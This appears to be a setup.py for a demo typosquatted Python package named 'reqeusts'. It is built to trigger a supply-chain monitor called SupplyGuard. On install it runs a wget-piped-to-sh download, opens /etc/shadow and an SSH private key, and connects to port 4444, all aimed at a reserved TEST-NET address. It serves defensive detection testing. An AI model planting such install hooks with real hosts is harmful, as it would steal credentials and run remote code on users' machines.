"""데모용 '타이포스쿼팅' 패키지 — reqeusts (requests 의 오타).

이 패키지는 SupplyGuard 탐지를 시연하기 위한 무해한 시뮬레이션이다. 실제 공급망 공격이
설치 단계(post-install)에서 흔히 하는 세 가지 행동을 흉내만 낸다. 아무것도 실제로 하지 않는다:
  - 원격 코드를 내려받거나 실행하지 않는다 (도메인은 TEST-NET-3 예약 대역이라 연결 불가).
  - 파일을 밖으로 보내지 않는다. 존재 여부만 확인하려고 열어 보고 즉시 닫는다.
  - 목적지는 전부 203.0.113.0/24 (RFC 5737 문서용, 라우팅되지 않음)이다.

pip 이 이 setup.py 를 실행하는 순간, 커널의 openat/execve/connect 시스템콜을 SupplyGuard 가
가로채 sandbox-secrets · no-shell-download · sandbox-egress 정책에 걸어 컨테이너를 격리한다.
sg-install 로 감시 컨테이너 안에서만 실행하라: `sg-install pip ./deploy/demo/reqeusts`
"""
import socket
import subprocess
import sys

BANNER = "[demo] typosquatted package 'reqeusts' post-install (harmless simulation)"


def touch(path):
    # 민감 파일 '접근' 시늉 — 열려고 시도만 하고, 내용은 읽지도 보내지도 않는다. openat 탐지를 유발한다.
    try:
        open(path, "rb").close()
        print(f"[demo] opened {path} (SupplyGuard should flag this)")
    except OSError as e:
        print(f"[demo] open {path} failed harmlessly: {e.__class__.__name__}")


def main():
    print(BANNER)

    # 1) execve — '외부 스크립트 실행' 패턴. 실제로는 예약 대역이라 아무것도 받지 못한다.
    #    셸에서 다운로더를 부르는 형태 자체가 no-shell-download / pipe-to-shell 정책에 걸린다.
    subprocess.run(
        ["sh", "-c", "wget -q -O- http://203.0.113.7/postinstall.sh | sh"],
        timeout=3,
        check=False,
    )

    # 2) openat — 자격 증명·계정 파일 접근 시늉.
    for p in ("/etc/shadow", "/root/.ssh/id_rsa"):
        touch(p)

    # 3) connect — 허용 목록 밖 목적지로 아웃바운드 (리버스 셸 포트). TEST-NET 이라 타임아웃난다.
    try:
        socket.create_connection(("203.0.113.7", 4444), timeout=2).close()
    except OSError:
        print("[demo] connect 203.0.113.7:4444 timed out harmlessly (TEST-NET)")

    print("[demo] done — 정상 설치라면 여기 도달하지만, SupplyGuard 는 1) 단계에서 이미 격리한다.")


if __name__ == "__main__":
    main()

# pip install 시 실행되도록: 최소 메타데이터. 실제 배포 목적이 아니다.
try:
    from setuptools import setup
    if "install" in sys.argv or "bdist_wheel" in sys.argv or "egg_info" in sys.argv:
        main()  # post-install 흉내: 빌드/설치 단계에서 위 행동을 유발
        setup(name="reqeusts", version="1.0.2", py_modules=[])
except ImportError:
    pass
